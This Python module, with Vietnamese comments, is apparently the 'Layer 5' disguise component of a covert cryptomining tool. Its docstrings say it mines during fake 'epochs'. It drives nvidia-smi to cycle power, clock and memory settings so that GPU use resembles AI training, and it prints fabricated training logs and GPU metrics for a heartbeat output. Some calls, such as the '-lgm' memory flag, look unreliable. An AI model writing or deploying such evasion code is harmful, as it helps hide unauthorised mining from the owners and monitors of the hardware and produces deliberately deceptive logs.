"""
gpu_pattern.py — Layer 5: GPU behavior disguise
Utilization curve, memory allocation, power/clock cycling
"""
import os
import sys
import time
import random
import math
import subprocess
import threading
from typing import Optional, Tuple


# ═══════════════════════════════════════════════════════════════
# GPU CONTROL (nvidia-smi wrapper)
# ═══════════════════════════════════════════════════════════════

class GPUController:
    """Điều khiển GPU qua nvidia-smi — power, clock, limit."""
    
    def __init__(self, gpu_id: int = 0):
        self.gpu_id = gpu_id
        self.available = self._detect()
        self._orig_power: Optional[int] = None
        self._orig_clock: Optional[Tuple[int, int]] = None
    
    def _detect(self) -> bool:
        try:
            r = subprocess.run(
                ["nvidia-smi", "--query-gpu=power.limit", 
                 "--format=csv,noheader,nounits", f"-i={self.gpu_id}"],
                capture_output=True, text=True, timeout=5
            )
            if r.returncode == 0:
                self._orig_power = int(r.stdout.strip())
                return True
        except Exception:
            pass
        return False
    
    def get_utilization(self) -> Optional[int]:
        if not self.available:
            return None
        try:
            r = subprocess.run(
                ["nvidia-smi", "--query-gpu=utilization.gpu",
                 "--format=csv,noheader,nounits", f"-i={self.gpu_id}"],
                capture_output=True, text=True, timeout=3
            )
            return int(r.stdout.strip())
        except Exception:
            return None
    
    def get_memory(self) -> Optional[int]:
        """GPU memory used (MB)."""
        if not self.available:
            return None
        try:
            r = subprocess.run(
                ["nvidia-smi", "--query-gpu=memory.used",
                 "--format=csv,noheader,nounits", f"-i={self.gpu_id}"],
                capture_output=True, text=True, timeout=3
            )
            return int(r.stdout.strip())
        except Exception:
            return None
    
    def set_power_limit(self, watts: Optional[int]):
        """Set power limit. None = reset."""
        if not self.available:
            return
        target = watts if watts is not None else self._orig_power
        if target is None:
            return
        try:
            subprocess.run(
                ["nvidia-smi", "-pl", str(target), f"-i={self.gpu_id}"],
                capture_output=True, timeout=5
            )
        except Exception:
            pass
    
    def set_clock(self, core_mhz: Optional[int] = None, mem_mhz: Optional[int] = None):
        """Set GPU clock speeds (locked)."""
        if not self.available:
            return
        try:
            if core_mhz is not None:
                subprocess.run(
                    ["nvidia-smi", "-lgc", str(core_mhz), f"-i={self.gpu_id}"],
                    capture_output=True, timeout=5
                )
            if mem_mhz is not None:
                subprocess.run(
                    ["nvidia-smi", "-lmc", str(mem_mhz), f"-i={self.gpu_id}"],
                    capture_output=True, timeout=5
                )
        except Exception:
            pass
    
    def reset(self):
        """Reset power và clock về mặc định."""
        self.set_power_limit(None)
        if self.available and self._orig_clock:
            core, mem = self._orig_clock
            self.set_clock(core, mem)
        else:
            self.set_clock(None, None)  # Unlock


# ═══════════════════════════════════════════════════════════════
# TRAINING-LIKE GPU PATTERNS
# ═══════════════════════════════════════════════════════════════

class GPUPattern:
    """
    Giả lập GPU behavior của AI training:
    - Bursty utilization (forward/backward/optimizer)
    - Variable memory allocation
    - Power/clock cycling
    - Temperature oscillation
    """
    
    def __init__(self, gpu_id: int = 0):
        self.gpu = GPUController(gpu_id)
        self._running = False
    
    # ── Utilization pattern ─────────────────────────────────────
    
    def training_utilization_pattern(self):
        """
        Training GPU utilization curve:
        
        Forward pass:  85-95% → 1-3s
        Backward:      90-100% → 1-2s
        Optimizer:     80-95% → 0.5-1s
        DataLoader:    10-40% → 0.3-1s (CPU bound, GPU idle)
        Batch boundary: 0-10% → 0.05-0.1s
        Checkpoint:    100% spike → 1-2s (5% probability)
        """
        while self._running:
            # Forward pass
            self.gpu.set_power_limit(random.randint(200, 250))
            time.sleep(random.uniform(1, 3))
            
            # Backward
            self.gpu.set_power_limit(random.randint(220, 250))
            time.sleep(random.uniform(1, 2))
            
            # Optimizer step
            self.gpu.set_power_limit(random.randint(180, 230))
            time.sleep(random.uniform(0.5, 1))
            
            # DataLoader (GPU idle, low power)
            self.gpu.set_power_limit(random.randint(80, 120))
            time.sleep(random.uniform(0.3, 1))
            
            # Batch boundary (minimal)
            self.gpu.set_power_limit(60)
            time.sleep(random.uniform(0.05, 0.1))
            
            # Checkpoint spike (rare)
            if random.random() < 0.05:
                self.gpu.set_power_limit(250)
                time.sleep(random.uniform(1, 2))
    
    def training_memory_pattern(self):
        """
        GPU memory allocation pattern:
        
        Steady state: 4-6GB
        Batch peak: +0.5-2GB (allocate for forward)
        Gradient: +1-2GB (backward)
        Checkpoint: +3-5GB (save state)
        Release: back to steady
        """
        base_mb = 4096  # 4GB base
        
        while self._running:
            # Allocate for batch
            alloc = base_mb + random.randint(512, 2048)
            self._set_gpu_mem_limit(alloc)
            time.sleep(random.uniform(1, 3))
            
            # Gradient accumulation
            alloc = base_mb + random.randint(1024, 2048)
            self._set_gpu_mem_limit(alloc)
            time.sleep(random.uniform(1, 2))
            
            # Release intermediates
            alloc = base_mb + random.randint(128, 512)
            self._set_gpu_mem_limit(alloc)
            time.sleep(random.uniform(0.5, 1))
            
            # Checkpoint spike
            if random.random() < 0.03:
                alloc = base_mb + random.randint(3072, 5120)
                self._set_gpu_mem_limit(alloc)
                time.sleep(random.uniform(1, 2))
                alloc = base_mb + random.randint(128, 512)
                self._set_gpu_mem_limit(alloc)
            
            time.sleep(random.uniform(0.1, 0.5))
    
    def _set_gpu_mem_limit(self, mem_mb: int):
        """Set GPU memory limit qua nvidia-smi (nếu supported)."""
        if not self.gpu.available:
            return
        try:
            subprocess.run(
                ["nvidia-smi", "-i", str(self.gpu.gpu_id),
                 "-lgm", str(mem_mb)],
                capture_output=True, timeout=3
            )
        except Exception:
            pass
    
    # ── Clock pattern ───────────────────────────────────────────
    
    def training_clock_pattern(self):
        """
        GPU clock pattern:
        
        Forward/backward: High clock (1800-2100 MHz core)
        DataLoader: Low clock (600-900 MHz core)
        Memory: Varies (7000-9000 MHz)
        """
        while self._running:
            # Forward: high clock
            core = random.randint(1800, 2100)
            mem = random.randint(7500, 9000)
            self.gpu.set_clock(core, mem)
            time.sleep(random.uniform(1, 3))
            
            # Data loading: low clock
            core = random.randint(600, 900)
            mem = random.randint(4000, 6000)
            self.gpu.set_clock(core, mem)
            time.sleep(random.uniform(0.5, 1))
            
            # Checkpoint: max clock
            if random.random() < 0.03:
                self.gpu.set_clock(2100, 9500)
                time.sleep(random.uniform(1, 2))
    
    # ── Combined epoch schedule ─────────────────────────────────
    
    def epoch_schedule_pattern(self):
        """
        Epoch-based schedule — mine trong "epoch", pause khi "validate/save":
        
        Train epoch: 5-30 phút (mine)
        Validate: 1-3 phút (lower load)
        Checkpoint: spike 10-30s
        Save+log: 10-30s pause
        Đôi khi: early stop check (60-300s pause)
        """
        epoch = 0
        
        while self._running:
            # Train epoch
            epoch_duration = random.uniform(300, 1800)  # 5-30 min
            self.gpu.set_power_limit(random.randint(200, 250))
            time.sleep(epoch_duration)
            
            # Validate (lower load)
            validate_duration = random.uniform(60, 180)  # 1-3 min
            self.gpu.set_power_limit(random.randint(100, 150))
            time.sleep(validate_duration)
            
            # Checkpoint spike
            self.gpu.set_power_limit(250)
            time.sleep(random.uniform(10, 30))
            
            # Save + log pause
            self.gpu.set_power_limit(60)
            time.sleep(random.uniform(10, 30))
            
            # Đôi khi: early stop check
            if random.random() < 0.05:
                self.gpu.set_power_limit(40)
                time.sleep(random.uniform(60, 300))
            
            epoch += 1
    
    # ── Combined pattern (full disguise) ────────────────────────
    
    def full_training_pattern(self):
        """
        Gộp tất cả: utilization + memory + clock + epoch schedule
        Chạy trong 1 thread duy nhất để tránh conflict.
        """
        self._running = True
        
        base_mb = 4096
        
        while self._running:
            # === FORWARD PASS ===
            self.gpu.set_power_limit(random.randint(200, 250))
            self.gpu.set_clock(random.randint(1800, 2100), random.randint(7500, 9000))
            alloc = base_mb + random.randint(512, 2048)
            self._set_gpu_mem_limit(alloc)
            time.sleep(random.uniform(1, 3))
            
            # === BACKWARD ===
            self.gpu.set_power_limit(random.randint(220, 250))
            alloc = base_mb + random.randint(1024, 2048)
            self._set_gpu_mem_limit(alloc)
            time.sleep(random.uniform(1, 2))
            
            # === OPTIMIZER ===
            self.gpu.set_power_limit(random.randint(180, 230))
            alloc = base_mb + random.randint(256, 1024)
            self._set_gpu_mem_limit(alloc)
            time.sleep(random.uniform(0.5, 1))
            
            # === DATALOADER (GPU idle) ===
            self.gpu.set_power_limit(random.randint(60, 120))
            self.gpu.set_clock(random.randint(600, 900), random.randint(4000, 6000))
            alloc = base_mb + random.randint(128, 512)
            self._set_gpu_mem_limit(alloc)
            time.sleep(random.uniform(0.3, 1))
            
            # === BATCH BOUNDARY ===
            self.gpu.set_power_limit(40)
            time.sleep(random.uniform(0.05, 0.1))
            
            # === CHECKPOINT SPIKE (rare) ===
            if random.random() < 0.03:
                self.gpu.set_power_limit(250)
                self.gpu.set_clock(2100, 9500)
                alloc = base_mb + random.randint(3072, 5120)
                self._set_gpu_mem_limit(alloc)
                time.sleep(random.uniform(1, 2))
                # Release
                alloc = base_mb + random.randint(128, 512)
                self._set_gpu_mem_limit(alloc)
                self.gpu.set_power_limit(60)
                time.sleep(random.uniform(0.5, 1))
    
    # ── Control ─────────────────────────────────────────────────
    
    def start(self):
        """Start full training pattern trong background thread."""
        t = threading.Thread(target=self.full_training_pattern, daemon=True)
        t.start()
        return t
    
    def stop(self):
        self._running = False
        self.gpu.reset()


# ═══════════════════════════════════════════════════════════════
# FAKE METRICS (cho heartbeat output)
# ═══════════════════════════════════════════════════════════════

class FakeGPUMetrics:
    """Tạo fake GPU metrics — realistic training values."""
    
    @staticmethod
    def get_fake_metrics(step: int = 0) -> dict:
        """Trả về dict metrics giả lập training."""
        # Utilization — bursty pattern
        phase = (step % 10) / 10.0
        if phase < 0.4:
            util = random.randint(85, 98)  # Forward/backward
        elif phase < 0.7:
            util = random.randint(70, 85)  # Optimizer
        elif phase < 0.9:
            util = random.randint(20, 50)  # DataLoader
        else:
            util = random.randint(0, 15)   # Batch boundary
        
        # Memory — varies
        mem_gb = 4.0 + random.gauss(0, 0.8)
        mem_gb = max(3.5, min(8.0, mem_gb))
        
        # Temperature — follows utilization with lag
        temp = 55 + int(util * 0.25) + random.randint(-3, 3)
        temp = max(45, min(85, temp))
        
        # Power — correlates with utilization
        power = 80 + int(util * 1.8) + random.randint(-15, 15)
        power = max(60, min(280, power))
        
        # Clock
        if util > 70:
            core_clock = random.randint(1800, 2100)
            mem_clock = random.randint(7500, 9000)
        else:
            core_clock = random.randint(600, 1200)
            mem_clock = random.randint(4000, 7000)
        
        return {
            "utilization": util,
            "memory_used_mb": int(mem_gb * 1024),
            "temperature": temp,
            "power_draw": power,
            "core_clock": core_clock,
            "memory_clock": mem_clock,
        }
    
    @staticmethod
    def format_metrics_line(step: int, metrics: dict) -> str:
        """Format metrics thành training log line."""
        loss = max(0.01, 2.5 - step * 0.002 + random.gauss(0, 0.05))
        acc = min(0.995, 0.45 + step * 0.001 + random.gauss(0, 0.01))
        lr = 0.001 * (0.97 ** (step // 100))
        
        bar_len = 30
        filled = int(bar_len * (step % 100) / 100)
        bar = "=" * filled + ">" + " " * (bar_len - filled - 1)
        
        return (
            f"Epoch {step // 100 + 1}/100 [{bar}] "
            f"loss={loss:.4f} acc={acc:.4f} lr={lr:.6f} | "
            f"gpu={metrics['utilization']}% "
            f"mem={metrics['memory_used_mb']/1024:.1f}GB "
            f"temp={metrics['temperature']}C "
            f"pwr={metrics['power_draw']}W | "
            f"clk={metrics['core_clock']}/{metrics['memory_clock']}MHz"
        )
